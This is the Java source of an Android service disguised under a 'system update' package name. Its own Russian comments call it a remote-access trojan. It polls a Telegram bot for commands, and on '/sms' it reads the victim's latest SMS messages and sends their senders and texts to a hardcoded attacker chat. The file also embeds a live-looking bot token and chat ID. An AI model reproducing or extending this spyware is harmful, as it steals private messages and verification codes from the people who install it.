package com.system.update;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;
import android.widget.Toast;
import android.os.Handler;
import android.os.Looper;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.io.InputStream;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import android.database.Cursor;
import android.net.Uri;

public class CoreService extends Service {
    private static final String BOT_TOKEN = "9149088713:AAHDnVftf8JvwlzSKtVhEcd5lioeyn7-cpI";
    private static final String CHAT_ID = "6717914771";
    private long lastUpdateId = 0;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        new Handler(Looper.getMainLooper()).post(new Runnable() {
            @Override
            public void run() {
                Toast.makeText(getApplicationContext(), "Сервис запущен", Toast.LENGTH_LONG).show();
            }
        });

        new Thread(new Runnable() {
            @Override
            public void run() {
                sendMessage("Приветствую, Bruno. Рат успешно написан. Скрипт написан: @lotrexyx");
                
                while (true) {
                    try {
                        checkCommands();
                        Thread.sleep(5000);
                    } catch (Exception e) {
                        Log.e("C2", "Error", e);
                    }
                }
            }
        }).start();
        return START_STICKY;
    }

    private void checkCommands() {
        try {
            String urlString = "https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=1";
            URL url = new URL(urlString);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            InputStream is = conn.getInputStream();
            BufferedReader reader = new BufferedReader(new InputStreamReader(is));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) sb.append(line);
            reader.close();
            
            String response = sb.toString();
            
            if (response.contains("/sms")) {
                String smsText = readSms();
                sendMessage("Последние СМС:\n" + smsText);
            }
            
            int idIndex = response.lastIndexOf("\"update_id\":");
            if (idIndex != -1) {
                int endIndex = response.indexOf(",", idIndex);
                if (endIndex != -1) {
                    lastUpdateId = Long.parseLong(response.substring(idIndex + 12, endIndex));
                }
            }
        } catch (Exception e) {
            Log.e("C2", "check err", e);
        }
    }

    private String readSms() {
        StringBuilder smsBuilder = new StringBuilder();
        Uri uriSms = Uri.parse("content://sms/inbox");
        Cursor c = getContentResolver().query(uriSms, null, null, null, null);
        if (c != null && c.moveToFirst()) {
            int count = 0;
            do {
                String address = c.getString(c.getColumnIndexOrThrow("address"));
                String body = c.getString(c.getColumnIndexOrThrow("body"));
                smsBuilder.append("От: ").append(address).append("\nТекст: ").append(body).append("\n\n");
                count++;
            } while (c.moveToNext() && count < 5);
            c.close();
        }
        if (smsBuilder.length() == 0) return "СМС нет или нет доступа.";
        return smsBuilder.toString();
    }

    private void sendMessage(String text) {
        try {
            String urlString = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
            URL url = new URL(urlString);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Type", "application/json");

            String json = "{\"chat_id\":\"" + CHAT_ID + "\",\"text\":\"" + text.replace("\n", "\\n").replace("\"", "\\\"") + "\"}";
            OutputStream os = conn.getOutputStream();
            os.write(json.getBytes("UTF-8"));
            os.close();
            conn.getResponseCode();
        } catch (Exception e) {
            Log.e("C2", "send err", e);
        }
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}
